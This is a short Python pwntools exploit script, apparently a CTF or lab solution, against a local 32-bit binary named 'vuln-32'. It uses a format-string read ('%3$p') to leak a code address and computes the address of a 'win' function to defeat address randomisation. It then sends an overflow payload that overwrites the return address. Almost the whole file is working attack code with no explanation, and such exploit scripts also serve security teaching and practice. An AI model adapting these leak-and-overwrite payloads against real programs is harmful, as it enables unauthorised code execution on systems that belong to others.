#!/usr/bin/env python3

from pwn import *

#'print "A" * 56 + "%23$p"

p = process('./vuln-32')

# in gdb we can leak some position from code with %3$p 
# main        = 0x56556251
# vuln        = 0x565561c9
# win         = 0x5655626d
# leak_format = 0x565561d5

win_offset = 0x5655626d - 0x565561d5


payload = b"%3$p"  # leaks address 

#p.clean()
p.recvuntil(b'name?\n')
p.sendline(payload)

p.recvuntil(b'you')
leak = int(p.recvline(), 16)
log.success(f'leak: {hex(leak)}')
new_win = leak + win_offset
log.success(f'new_win: {hex(new_win)}')


payload =b"A"* 20
payload += b"AAAABBBBCCCC"
payload += p32(new_win)

p.recvuntil(b'message?')
p.sendline(payload)

# receive output
print(p.recvline().decode())
print(p.recvline().decode())
